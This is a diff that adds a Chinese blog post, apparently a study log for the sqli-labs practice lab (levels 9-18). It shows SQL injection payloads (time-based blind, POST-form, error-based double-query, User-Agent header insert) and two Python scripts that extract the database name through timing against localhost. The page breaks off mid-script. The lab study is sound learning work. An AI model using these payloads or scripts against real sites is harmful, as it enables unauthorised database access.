@@ -1,0 +1,1122 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>sqli-labs的学习记录二（9-22） - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-08-03 10:45" pubdate>
+        2018年8月3日 上午
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:2.6k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">sqli-labs的学习记录二（9-22）</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>sqli-labs上的sql注入学习第二部分，上半部分（1-8）→<a href="https://lzy-wi.github.io/2018/07/20/sqli-labs1/" target="_blank" rel="noopener">sqli-labs的学习记录一</a><br><a id="more"></a></p>
+<h5 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h5><p>&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如<code>(ascii(substr(database(),1,1))&gt;=97</code>,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。<br>所以最终payload为<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>' and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">0</span>)) -- +</code></pre></p>
+<p>然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+txt1 = <span class="hljs-string">"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),"</span>
+txt2 = <span class="hljs-string">",1))&gt;="</span>
+txt3 = <span class="hljs-string">",1))="</span>
+txt4 = <span class="hljs-string">",sleep(2),sleep(0)) -- +"</span>
+num11 = <span class="hljs-number">97</span>
+num12 = <span class="hljs-number">65</span>
+num13 = <span class="hljs-number">48</span>
+code = <span class="hljs-string">''</span>
+num1 = <span class="hljs-number">0</span>
+num2 = <span class="hljs-number">0</span>
+num3 = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):
+	url = txt1+str(i)+txt2+str(num11)+txt4
+	time1 = time.time()
+	req = requests.get(url = url)
+	time2 = time.time()
+	<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+		num1 = <span class="hljs-number">1</span>
+		
+	url = txt1+str(i)+txt2+str(num12)+txt4
+	time1 = time.time()
+	req = requests.get(url = url)
+	time2 = time.time()
+	<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+		num2 = <span class="hljs-number">1</span>
+
+	url = txt1+str(i)+txt2+str(num13)+txt4
+	time1 = time.time()
+	req = requests.get(url = url)
+	time2 = time.time()
+	<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+		num3 = <span class="hljs-number">1</span>
+
+
+	<span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">1</span>):
+		num = <span class="hljs-number">97</span>
+		num += <span class="hljs-number">13</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			num += <span class="hljs-number">6</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">7</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			num += <span class="hljs-number">3</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">3</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):
+			num -= <span class="hljs-number">3</span>
+		<span class="hljs-keyword">if</span>((num == <span class="hljs-number">106</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">119</span>)):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				time1 = time.time()
+				req = requests.get(url = url)
+				time2 = time.time()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				time1 = time.time()
+				req = requests.get(url = url)
+				time2 = time.time()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num2 == <span class="hljs-number">1</span>):
+		num = <span class="hljs-number">65</span>
+		num += <span class="hljs-number">13</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			num += <span class="hljs-number">6</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">7</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			num += <span class="hljs-number">3</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">3</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):
+			num -= <span class="hljs-number">3</span>
+		<span class="hljs-keyword">if</span>((num == <span class="hljs-number">74</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">87</span>)):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				time1 = time.time()
+				req = requests.get(url = url)
+				time2 = time.time()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				time1 = time.time()
+				req = requests.get(url = url)
+				time2 = time.time()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">if</span>(num2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num3 == <span class="hljs-number">1</span>):
+		num =<span class="hljs-number">48</span>
+		num += <span class="hljs-number">5</span>
+		url = txt1+str(i)+txt2+str(num)+txt4
+		time1 = time.time()
+		req = requests.get(url = url)
+		time2 = time.time()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				time1 = time.time()
+				req = requests.get(url = url)
+				time2 = time.time()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">5</span>
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				time1 = time.time()
+				req = requests.get(url = url)
+				time2 = time.time()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span></code></pre></p>
+<p>附上截图<br><img src="/img/2018-08-03/1.png" srcset="/img/static/loading.gif" alt="1"></p>
+<h5 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h5><p>也是时间盲注，基于双引号，把单引号变成双引号即可<br><pre><code class="hljs undefined"><span class="hljs-attribute">id</span>=1" <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- +</code></pre></p>
+<h5 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h5><p>第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数<code>uname</code>和<code>passwd</code><br><img src="/img/2018-08-03/2.png" srcset="/img/static/loading.gif" alt="2"><br>post型注入要勾选上post data，最后不要忘记<code>submit=Submit</code><br><img src="/img/2018-08-03/3.png" srcset="/img/static/loading.gif" alt="3"><br>&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）<br>继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname</span>=123&amp;passwd=123' union select 1,database() -- +&amp;<span class="hljs-attribute">submit</span>=Submit</code></pre></p>
+<p><img src="/img/2018-08-03/4.png" srcset="/img/static/loading.gif" alt="4"></p>
+<h5 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h5><p>基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname</span>=123&amp;passwd=456") union select 1,database() -- + &amp;<span class="hljs-attribute">submit</span>=Submit</code></pre></p>
+<p><img src="/img/2018-08-03/5.png" srcset="/img/static/loading.gif" alt="5"></p>
+<h5 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h5><p>post型基于单引号的双注入，第五关讲过，直接拿第五关的payload<br><pre><code class="hljs undefined">uname=123&amp;passwd=123') union <span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">-- + &amp;submit=Submit</span></code></pre></p>
+<p>一次没成功就多试几次<br><img src="/img/2018-08-03/6.png" srcset="/img/static/loading.gif" alt="6"></p>
+<h5 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h5><p>post型基于双引号的双注入，跟第十三关一样，payload如下<br><pre><code class="hljs undefined">uname=123&amp;passwd=123" union <span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">-- + &amp;submit=Submit</span></code></pre></p>
+<p><img src="/img/2018-08-03/7.png" srcset="/img/static/loading.gif" alt="7"></p>
+<h5 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h5><p>post型单引号盲注，测试布尔型<br><pre><code class="hljs undefined"><span class="hljs-attr">uname</span>=<span class="hljs-number">123</span>&amp;passwd=<span class="hljs-number">123</span><span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span> &amp;submit=Submit</code></pre></p>
+<p><img src="/img/2018-08-03/8.png" srcset="/img/static/loading.gif" alt="8"><br>测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败</p>
+<h5 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h5><p>post型双引号盲注和第十五关一样<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname</span>=123&amp;passwd=123") <span class="hljs-keyword">or</span> <span class="hljs-string">"1"</span>=<span class="hljs-string">"1"</span> -- + &amp;<span class="hljs-attribute">submit</span>=Submit</code></pre></p>
+<p><img src="/img/2018-08-03/9.png" srcset="/img/static/loading.gif" alt="9"></p>
+<h5 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h5><p>基于错误的更新查询post注入<br><strong>高版本的mysql已经修复了这个bug</strong><br>有兴趣的可以去了解下<br>–&gt;<a href="https://blog.csdn.net/Fly_hps/article/details/79416842" target="_blank" rel="noopener">传送门</a><br>–&gt;<a href="https://blog.csdn.net/u012763794/article/details/51361152" target="_blank" rel="noopener">传送门</a><br>–&gt;<a href="https://www.cnblogs.com/xishaonian/p/6243497.html" target="_blank" rel="noopener">传送门</a></p>
+<h5 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h5><p>请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）<br>先抓包<br><img src="/img/2018-08-03/10.png" srcset="/img/static/loading.gif" alt="10"><br>在User-Agent后面加一个单引号<br><pre><code class="hljs undefined">User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56.0</span><span class="hljs-string">'</span></code></pre></p>
+<p>发现报错，说明可以注入<br><img src="/img/2018-08-03/11.png" srcset="/img/static/loading.gif" alt="11"><br>一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码<br><pre><code class="hljs undefined">$insert=<span class="hljs-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span><span class="hljs-comment">;</span></code></pre></p>
+<p>因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入<br><em>user-agent简写成Mozilla/5.0 Firefox/56.0</em><br><pre><code class="hljs undefined">User-Agent: Mozilla/<span class="hljs-number">5.0</span> Firefox/<span class="hljs-number">56.0</span>' <span class="hljs-keyword">or</span> <span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">or</span> '</code></pre></p>
+<p>最后要闭合单引号，不可以注释掉（我也不知道原因π_π）<br>5秒后返回正常页面<br><img src="/img/2018-08-03/12.png" srcset="/img/static/loading.gif" alt="12"><br>猜测数据库<br><pre><code class="hljs undefined">User-Agent: Mozilla/<span class="hljs-number">5.0</span> Firefox/<span class="hljs-number">56.0</span>' <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-built_in">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-built_in">sleep</span>(<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> '</code></pre></p>
+<p>5秒后返回<br><img src="/img/2018-08-03/13.png" srcset="/img/static/loading.gif" alt="13"><br>盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了<br><pre><code class="hljs undefined">import requests
+import <span class="hljs-built_in">time</span>
+
+txt1 = <span class="hljs-string">"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),"</span>
+txt2 = <span class="hljs-string">",1))&gt;="</span>
+txt3 = <span class="hljs-string">",1))="</span>
+txt4 = <span class="hljs-string">",sleep(2),sleep(0)) or '"</span>
+<span class="hljs-built_in">key</span> = &#123;'uname':'admin','passwd':'admin','submit':'Submit'&#125;
+url = <span class="hljs-string">"http://localhost/sqli-labs/Less-18/"</span>
+num11 = <span class="hljs-number">97</span>
+num12 = <span class="hljs-number">65</span>
+num13 = <span class="hljs-number">48</span>
+code = ''
+num1 = <span class="hljs-number">0</span>
+num2 = <span class="hljs-number">0</span>
+num3 = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):
+	payload = txt1+str(i)+txt2+str(num11)+txt4
+	headers = &#123;'User-Agent': payload&#125;
+	time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+	req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+	time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+	<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+		num1 = <span class="hljs-number">1</span>
+		
+	payload = txt1+str(i)+txt2+str(num12)+txt4
+	headers = &#123;'User-Agent': payload&#125;
+	time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+	req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+	time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+	<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+		num2 = <span class="hljs-number">1</span>
+
+	payload = txt1+str(i)+txt2+str(num13)+txt4
+	headers = &#123;'User-Agent': payload&#125;
+	time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+	req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+	time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+	<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+		num3 = <span class="hljs-number">1</span>
+
+
+	<span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">1</span>):
+		<span class="hljs-built_in">num</span> = <span class="hljs-number">97</span>
+		<span class="hljs-built_in">num</span> += <span class="hljs-number">13</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		headers = &#123;'User-Agent': payload&#125;
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			<span class="hljs-built_in">num</span> += <span class="hljs-number">6</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">7</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		headers = &#123;'User-Agent': payload&#125;
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			<span class="hljs-built_in">num</span> += <span class="hljs-number">3</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		headers = &#123;'User-Agent': payload&#125;
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span>
+		<span class="hljs-keyword">if</span>((<span class="hljs-built_in">num</span> == <span class="hljs-number">106</span>) <span class="hljs-keyword">or</span> (<span class="hljs-built_in">num</span> == <span class="hljs-number">119</span>)):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">4</span>):
+				payload = txt1+str(i)+txt3+str(j)+txt4
+				headers = &#123;'User-Agent': payload&#125;
+				time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+				time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-built_in">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">3</span>):
+				payload = txt1+str(i)+txt3+str(j)+txt4
+				headers = &#123;'User-Agent': payload&#125;
+				time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+				time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-built_in">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num2 == <span class="hljs-number">1</span>):
+		<span class="hljs-built_in">num</span> = <span class="hljs-number">65</span>
+		<span class="hljs-built_in">num</span> += <span class="hljs-number">13</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		headers = &#123;'User-Agent': payload&#125;
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			<span class="hljs-built_in">num</span> += <span class="hljs-number">6</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">7</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		headers = &#123;'User-Agent': payload&#125;
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			<span class="hljs-built_in">num</span> += <span class="hljs-number">3</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		headers = &#123;'User-Agent': payload&#125;
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
